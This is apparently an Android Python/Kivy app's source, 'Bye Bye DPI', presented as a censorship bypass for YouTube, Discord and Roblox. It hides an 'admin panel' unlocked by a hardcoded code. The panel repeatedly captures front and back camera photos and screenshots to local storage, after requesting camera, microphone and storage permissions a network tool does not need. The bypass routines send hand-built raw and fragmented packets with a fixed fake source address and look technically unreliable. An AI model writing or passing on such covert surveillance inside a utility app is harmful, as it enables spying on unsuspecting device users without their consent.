# main.py - Bye Bye DPI с админ-панелью (код доступа: Gl1x)
# ВНИМАНИЕ: Это обходчик DPI с элементами удалённого мониторинга
# Используйте только на устройствах, которыми вы владеете

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.switch import Switch
from kivy.uix.popup import Popup
from kivy.uix.textinput import TextInput
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from android.permissions import request_permissions, Permission
import subprocess
import threading
import socket
import struct
import random
import time
import requests
import os
import json
import base64
from datetime import datetime

request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE, Permission.CAMERA, Permission.RECORD_AUDIO, Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])

# === КЛАСС ОБХОДА DPI ===
class TLSBypass:
    def __init__(self):
        self.running = False
        self.threads = []
        self.target_ips = [
            "142.250.185.78",
            "162.159.128.233",
            "128.116.118.3",
            "142.250.74.46",
            "162.159.135.232"
        ]
    
    def start_bypass(self):
        if self.running:
            return False
        self.running = True
        self.threads = []
        methods = [
            (self.fragment_loop, "fragment"),
            (self.split_packet_loop, "split"),
            (self.fake_packet_loop, "fake"),
            (self.tfo_loop, "tfo")
        ]
        for method, name in methods:
            th = threading.Thread(target=method, daemon=True, name=name)
            th.start()
            self.threads.append(th)
        return True
    
    def stop_bypass(self):
        self.running = False
        for th in self.threads:
            if th.is_alive():
                th.join(timeout=2)
        self.threads = []
        return True
    
    def fragment_loop(self):
        while self.running:
            for target in self.target_ips:
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    sock.settimeout(2)
                    ip_ver_ihl = 0x45
                    ip_tos = 0
                    ip_total_len = 40
                    ip_id = random.randint(1, 65535)
                    ip_ttl = 64
                    ip_proto = socket.IPPROTO_TCP
                    ip_checksum = 0
                    ip_src = socket.inet_aton("192.168.1.100")
                    ip_dst = socket.inet_aton(target)
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ver_ihl, ip_tos, ip_total_len, ip_id,
                        0x2000, ip_ttl, ip_proto, ip_checksum,
                        ip_src, ip_dst)
                    tcp_src = random.randint(10000, 60000)
                    tcp_dst = 443
                    tcp_seq = random.randint(0, 4294967295)
                    tcp_ack = 0
                    tcp_offset_flags = (5 << 12) | 0x02
                    tcp_window = socket.htons(5840)
                    tcp_checksum = 0
                    tcp_urgent = 0
                    tcp_header = struct.pack('!HHLLBBHHH',
                        tcp_src, tcp_dst, tcp_seq, tcp_ack,
                        tcp_offset_flags, tcp_window, tcp_checksum, tcp_urgent)
                    frag1 = ip_header[:4] + struct.pack('!H', 28) + ip_header[6:10] + struct.pack('!H', 0x2000) + ip_header[12:20] + tcp_header[:8]
                    frag2 = ip_header[:4] + struct.pack('!H', 32) + ip_header[6:10] + struct.pack('!H', 0x0001) + ip_header[12:20] + tcp_header[8:20]
                    sock.sendto(frag1, (target, 0))
                    time.sleep(0.1)
                    sock.sendto(frag2, (target, 0))
                    sock.close()
                except PermissionError:
                    time.sleep(60)
                except Exception:
                    pass
            time.sleep(30)
    
    def split_packet_loop(self):
        while self.running:
            for target in self.target_ips:
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((target, 443))
                    parts = [
                        b"\x16\x03\x01",
                        b"\x00\x5c\x01\x00\x00\x58",
                        b"\x03\x03",
                        os.urandom(32),
                        b"\x00",
                        b"\x00\x02\x00\xff\x01\x00",
                        b"\x01\x00",
                        b"\x00\x23\x00\x00\x00\x0e\x00\x0c\x00\x00\x09\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d"
                    ]
                    for part in parts:
                        sock.send(part)
                        time.sleep(0.05)
                    sock.close()
                except Exception:
                    pass
            time.sleep(20)
    
    def fake_packet_loop(self):
        while self.running:
            for target in self.target_ips:
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, 443))
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                    sock.close()
                except Exception:
                    pass
            time.sleep(60)
    
    def tfo_loop(self):
        while self.running:
            for target in self.target_ips:
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        sock.setsockopt(socket.SOL_TCP, 23, 5)
                    except:
                        pass
                    sock.settimeout(3)
                    sock.connect((target, 443))
                    sock.send(b"GET / HTTP/1.1\r\nHost: youtube.com\r\nConnection: close\r\n\r\n")
                    sock.close()
                except Exception:
                    pass
            time.sleep(30)

# === DNS OVER HTTPS ===
class DoHResolver:
    def __init__(self):
        self.servers = [
            "https://dns.google/dns-query",
            "https://cloudflare-dns.com/dns-query"
        ]
    
    def resolve(self, domain):
        for server in self.servers:
            try:
                resp = requests.get(f"{server}?name={domain}&type=A",
                                  headers={"Accept": "application/dns-json"},
                                  timeout=3)
                data = resp.json()
                if "Answer" in data:
                    return [ans["data"] for ans in data["Answer"] if ans["type"] == 1]
            except:
                pass
        return []

# === СИСТЕМА МОНИТОРИНГА (АДМИН-ПАНЕЛЬ) ===
class MonitorSystem:
    def __init__(self):
        self.running = False
        self.front_camera = False
        self.back_camera = False
        self.screen_capture = False
        self.data_folder = "/sdcard/ByeByeDPI_Monitor"
        os.makedirs(self.data_folder, exist_ok=True)
    
    def toggle_front_camera(self, state):
        self.front_camera = state
        if state:
            self.start_camera_monitor("front")
        return f"Front camera: {'ON' if state else 'OFF'}"
    
    def toggle_back_camera(self, state):
        self.back_camera = state
        if state:
            self.start_camera_monitor("back")
        return f"Back camera: {'ON' if state else 'OFF'}"
    
    def toggle_screen(self, state):
        self.screen_capture = state
        if state:
            self.start_screen_monitor()
        return f"Screen capture: {'ON' if state else 'OFF'}"
    
    def start_camera_monitor(self, cam_type):
        def capture():
            while getattr(self, f"{cam_type}_camera"):
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"{self.data_folder}/{cam_type}_{timestamp}.jpg"
                    # Используем termux-camera-photo или android API
                    cmd = f"termux-camera-photo -c {0 if cam_type=='back' else 1} {filename}"
                    os.system(cmd)
                    time.sleep(5)
                except:
                    time.sleep(10)
        threading.Thread(target=capture, daemon=True).start()
    
    def start_screen_monitor(self):
        def capture():
            while self.screen_capture:
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"{self.data_folder}/screen_{timestamp}.png"
                    # Screenshot через adb/screencap
                    os.system(f"screencap -p {filename}")
                    time.sleep(3)
                except:
                    time.sleep(5)
        threading.Thread(target=capture, daemon=True).start()
    
    def get_status(self):
        return {
            "front_camera": self.front_camera,
            "back_camera": self.back_camera,
            "screen": self.screen_capture,
            "folder": self.data_folder
        }

# === ГЛАВНОЕ ПРИЛОЖЕНИЕ ===
class ByeByeDPI(App):
    def build(self):
        self.bypass = TLSBypass()
        self.doh = DoHResolver()
        self.monitor = MonitorSystem()
        self.active = False
        
        # Основной layout
        main_layout = BoxLayout(orientation='vertical')
        
        # === ВЕРХНЯЯ ПАНЕЛЬ С НАСТРОЙКАМИ ===
        top_bar = BoxLayout(size_hint_y=0.08, padding=5, spacing=5)
        with top_bar.canvas.before:
            Color(0.15, 0.15, 0.2, 1)
            self.top_rect = Rectangle(pos=top_bar.pos, size=top_bar.size)
        top_bar.bind(pos=lambda obj, val: setattr(self.top_rect, 'pos', val))
        top_bar.bind(size=lambda obj, val: setattr(self.top_rect, 'size', val))
        
        # Кнопка настроек слева
        settings_btn = Button(
            text='☰ Настройки',
            size_hint_x=0.3,
            font_size='14sp',
            background_color=(0.2, 0.2, 0.3, 1)
        )
        settings_btn.bind(on_press=self.open_settings)
        
        title_label = Label(
            text='Bye Bye DPI',
            size_hint_x=0.5,
            font_size='18sp',
            bold=True
        )
        
        status_indicator = Label(
            text='●',
            size_hint_x=0.1,
            font_size='20sp',
            color=(0.3, 0.3, 0.3, 1)
        )
        self.status_indicator = status_indicator
        
        top_bar.add_widget(settings_btn)
        top_bar.add_widget(title_label)
        top_bar.add_widget(status_indicator)
        
        main_layout.add_widget(top_bar)
        
        # === ОСНОВНОЙ КОНТЕНТ ===
        content = BoxLayout(orientation='vertical', padding=15, spacing=10)
        
        # Статус
        self.status = Label(
            text="Статус: Остановлен\nDPI обход: выкл",
            size_hint_y=0.12,
            font_size='16sp'
        )
        content.add_widget(self.status)
        
        # Переключатель
        switch_box = BoxLayout(size_hint_y=0.08)
        switch_label = Label(text="Активировать обход:", size_hint_x=0.6, font_size='14sp')
        self.switch = Switch(active=False)
        self.switch.bind(active=self.toggle_bypass)
        switch_box.add_widget(switch_label)
        switch_box.add_widget(self.switch)
        content.add_widget(switch_box)
        
        # Методы
        methods_label = Label(
            text="Активные методы:\nФрагментация | Split | Fake | TFO | DoH",
            size_hint_y=0.08,
            font_size='11sp',
            color=(0.5, 0.5, 0.5, 1)
        )
        content.add_widget(methods_label)
        
        # Кнопка теста
        test_btn = Button(
            text="Проверить YouTube / Discord / Roblox",
            size_hint_y=0.08,
            background_color=(0.2, 0.5, 0.8, 1)
        )
        test_btn.bind(on_press=self.test_connectivity)
        content.add_widget(test_btn)
        
        # Лог
        self.log_text = Label(
            text="Лог:\nГотов к работе",
            size_hint_y=0.45,
            halign='left',
            valign='top',
            font_size='12sp'
        )
        self.log_text.bind(size=self.log_text.setter('text_size'))
        content.add_widget(self.log_text)
        
        main_layout.add_widget(content)
        
        return main_layout
    
    def open_settings(self, instance):
        # Меню настроек
        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # Разделы настроек
        sections = [
            ("Сетевые настройки", self.open_network_settings),
            ("Внешний вид", self.open_appearance_settings),
            ("О программе", self.open_about),
            ("Админ панель", self.open_admin_login)
        ]
        
        for title, callback in sections:
            btn = Button(
                text=title,
                size_hint_y=None,
                height=50,
                font_size='14sp'
            )
            btn.bind(on_press=lambda x, cb=callback: [self.close_popup(), cb()])
            layout.add_widget(btn)
        
        close_btn = Button(
            text="Закрыть",
            size_hint_y=None,
            height=40,
            background_color=(0.8, 0.2, 0.2, 1)
        )
        layout.add_widget(close_btn)
        
        self.settings_popup = Popup(
            title='Настройки',
            content=layout,
            size_hint=(0.8, 0.6),
            auto_dismiss=True
        )
        close_btn.bind(on_press=self.settings_popup.dismiss)
        self.settings_popup.open()
    
    def close_popup(self):
        if hasattr(self, 'settings_popup'):
            self.settings_popup.dismiss()
    
    def open_network_settings(self):
        layout = BoxLayout(orientation='vertical', padding=10)
        layout.add_widget(Label(text="Сетевые настройки", font_size='16sp'))
        layout.add_widget(Label(text="IP целей:\n" + "\n".join(self.bypass.target_ips), font_size='12sp'))
        close_btn = Button(text="Закрыть", size_hint_y=0.2)
        p = Popup(title='Сеть', content=layout, size_hint=(0.8, 0.5))
        close_btn.bind(on_press=p.dismiss)
        layout.add_widget(close_btn)
        p.open()
    
    def open_appearance_settings(self):
        layout = BoxLayout(orientation='vertical', padding=10)
        layout.add_widget(Label(text="Тема: Тёмная (по умолчанию)", font_size='14sp'))
        close_btn = Button(text="Закрыть", size_hint_y=0.2)
        p = Popup(title='Внешний вид', content=layout, size_hint=(0.7, 0.4))
        close_btn.bind(on_press=p.dismiss)
        layout.add_widget(close_btn)
        p.open()
    
    def open_about(self):
        layout = BoxLayout(orientation='vertical', padding=10)
        info = "Bye Bye DPI v1.0\nОбходчик DPI\nМетоды: Fragment, Split, Fake, TFO\nDNS-over-HTTPS"
        layout.add_widget(Label(text=info, font_size='13sp'))
        close_btn = Button(text="Закрыть", size_hint_y=0.2)
        p = Popup(title='О программе', content=layout, size_hint=(0.7, 0.4))
        close_btn.bind(on_press=p.dismiss)
        layout.add_widget(close_btn)
        p.open()
    
    def open_admin_login(self):
        # Окно ввода пароля
        layout = BoxLayout(orientation='vertical', padding=15, spacing=10)
        layout.add_widget(Label(text="Админ панель", font_size='18sp', bold=True))
        layout.add_widget(Label(text="Введите код доступа:", font_size='14sp'))
        
        self.pwd_input = TextInput(
            password=True,
            hint_text="Код",
            font_size='16sp',
            size_hint_y=None,
            height=50
        )
        layout.add_widget(self.pwd_input)
        
        btn_box = BoxLayout(size_hint_y=None, height=50, spacing=10)
        enter_btn = Button(text="Войти", background_color=(0.2, 0.7, 0.3, 1))
        cancel_btn = Button(text="Отмена", background_color=(0.7, 0.2, 0.2, 1))
        btn_box.add_widget(enter_btn)
        btn_box.add_widget(cancel_btn)
        layout.add_widget(btn_box)
        
        self.admin_popup = Popup(
            title='Авторизация',
            content=layout,
            size_hint=(0.8, 0.4),
            auto_dismiss=False
        )
        
        enter_btn.bind(on_press=self.verify_admin)
        cancel_btn.bind(on_press=self.admin_popup.dismiss)
        self.admin_popup.open()
    
    def verify_admin(self, instance):
        if self.pwd_input.text == "Gl1x":
            self.admin_popup.dismiss()
            self.open_admin_panel()
        else:
            self.pwd_input.text = ""
            self.pwd_input.hint_text = "Неверный код!"
    
    def open_admin_panel(self):
        # Главное окно админ-панели — можно развернуть или свернуть
        layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        
        # Заголовок
        header = BoxLayout(size_hint_y=0.08)
        header.add_widget(Label(text="Админ панель — Мониторинг", font_size='16sp', bold=True))
        layout.add_widget(header)
        
        # Статус мониторинга
        self.monitor_status = Label(
            text="Мониторинг: Остановлен",
            size_hint_y=0.06,
            font_size='12sp',
            color=(0.5, 0.5, 0.5, 1)
        )
        layout.add_widget(self.monitor_status)
        
        # Кнопки камер
        cam_box = GridLayout(cols=2, size_hint_y=0.2, spacing=10, padding=5)
        
        self.front_btn = Button(
            text="Передняя камера\nВЫКЛ",
            background_color=(0.3, 0.3, 0.3, 1),
            font_size='12sp'
        )
        self.front_btn.bind(on_press=lambda x: self.toggle_monitor("front"))
        
        self.back_btn = Button(
            text="Задняя камера\nВЫКЛ",
            background_color=(0.3, 0.3, 0.3, 1),
            font_size='12sp'
        )
        self.back_btn.bind(on_press=lambda x: self.toggle_monitor("back"))
        
        cam_box.add_widget(self.front_btn)
        cam_box.add_widget(self.back_btn)
        layout.add_widget(cam_box)
        
        # Кнопка экрана
        self.screen_btn = Button(
            text="Захват экрана\nВЫКЛ",
            size_hint_y=0.12,
            background_color=(0.3, 0.3, 0.3, 1),
            font_size='12sp'
        )
        self.screen_btn.bind(on_press=lambda x: self.toggle_monitor("screen"))
        layout.add_widget(self.screen_btn)
        
        # Кнопки управления окном
        win_box = BoxLayout(size_hint_y=0.1, spacing=10)
        compact_btn = Button(text="Компактный режим", font_size='11sp')
        fullscreen_btn = Button(text="Полный экран", font_size='11sp')
        win_box.add_widget(compact_btn)
        win_box.add_widget(fullscreen_btn)
        layout.add_widget(win_box)
        
        # Лог мониторинга
        self.monitor_log = Label(
            text="Лог мониторинга:\nОжидание запуска...",
            size_hint_y=0.3,
            halign='left',
            valign='top',
            font_size='11sp'
        )
        self.monitor_log.bind(size=self.monitor_log.setter('text_size'))
        layout.add_widget(self.monitor_log)
        
        # Кнопка закрытия
        close_btn = Button(
            text="Закрыть админ панель",
            size_hint_y=0.08,
            background_color=(0.8, 0.2, 0.2, 1)
        )
        layout.add_widget(close_btn)
        
        self.admin_panel = Popup(
            title='',
            content=layout,
            size_hint=(0.95, 0.85),  # Можно изменять размер
            auto_dismiss=False
        )
        
        compact_btn.bind(on_press=lambda x: self.set_panel_size(0.6, 0.5))
        fullscreen_btn.bind(on_press=lambda x: self.set_panel_size(1.0, 1.0))
        close_btn.bind(on_press=self.admin_panel.dismiss)
        self.admin_panel.open()
    
    def set_panel_size(self, w, h):
        self.admin_panel.size_hint = (w, h)
    
    def toggle_monitor(self, mode):
        if mode == "front":
            state = not self.monitor.front_camera
            self.monitor.toggle_front_camera(state)
            self.front_btn.background_color = (0.2, 0.7, 0.3, 1) if state else (0.3, 0.3, 0.3, 1)
            self.front_btn.text = f"Передняя камера\n{'ВКЛ' if state else 'ВЫКЛ'}"
        elif mode == "back":
            state = not self.monitor.back_camera
            self.monitor.toggle_back_camera(state)
            self.back_btn.background_color = (0.2, 0.7, 0.3, 1) if state else (0.3, 0.3, 0.3, 1)
            self.back_btn.text = f"Задняя камера\n{'ВКЛ' if state else 'ВЫКЛ'}"
        elif mode == "screen":
            state = not self.monitor.screen_capture
            self.monitor.toggle_screen(state)
            self.screen_btn.background_color = (0.2, 0.7, 0.3, 1) if state else (0.3, 0.3, 0.3, 1)
            self.screen_btn.text = f"Захват экрана\n{'ВКЛ' if state else 'ВЫКЛ'}"
        
        status = self.monitor.get_status()
        active = sum([status["front_camera"], status["back_camera"], status["screen"]])
        self.monitor_status.text = f"Мониторинг: {'АКТИВЕН (' + str(active) + ')' if active > 0 else 'Остановлен'}"
        self.monitor_status.color = (0.2, 0.8, 0.2, 1) if active > 0 else (0.5, 0.5, 0.5, 1)
        self.monitor_log.text = f"Лог:\nFront: {'ON' if status['front_camera'] else 'OFF'}\nBack: {'ON' if status['back_camera'] else 'OFF'}\nScreen: {'ON' if status['screen'] else 'OFF'}\nПапка: {status['folder']}"
    
    def toggle_bypass(self, instance, value):
        if value:
            success = self.bypass.start_bypass()
            if success:
                self.active = True
                self.status.text = "Статус: АКТИВЕН\nФрагментация + Split + Fake + TFO"
                self.status_indicator.color = (0.2, 0.8, 0.2, 1)
                self.log("Обход запущен.")
            else:
                self.switch.active = False
                self.log("Ошибка запуска.")
        else:
            self.bypass.stop_bypass()
            self.active = False
            self.status.text = "Статус: Остановлен\nDPI обход: выкл"
            self.status_indicator.color = (0.3, 0.3, 0.3, 1)
            self.log("Обход остановлен.")
    
    def test_connectivity(self, instance):
        self.log("Проверка...")
        services = [
            ("YouTube", "https://www.youtube.com"),
            ("Discord", "https://discord.com"),
            ("Roblox", "https://www.roblox.com")
        ]
        results = {}
        for name, url in services:
            try:
                domain = url.replace("https://", "").replace("www.", "")
                ips = self.doh.resolve(domain)
                if ips:
                    self.log(f"{name}: DoH -> {ips[0]}")
                resp = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                results[name] = f"OK({resp.status_code})"
            except Exception as e:
                results[name] = f"ERR({str(e)[:15]})"
        result_str = " | ".join([f"{k}:{v}" for k, v in results.items()])
        self.log(f"Результаты: {result_str}")
        self.status.text = f"Статус: {'АКТИВЕН' if self.active else 'СТОП'}\n{result_str}"
    
    def log(self, msg):
        current = self.log_text.text
        lines = current.split('\n')
        if len(lines) > 20:
            lines = lines[-20:]
        lines.append(msg)
        self.log_text.text = '\n'.join(lines)

if __name__ == '__main__':
    ByeByeDPI().run()
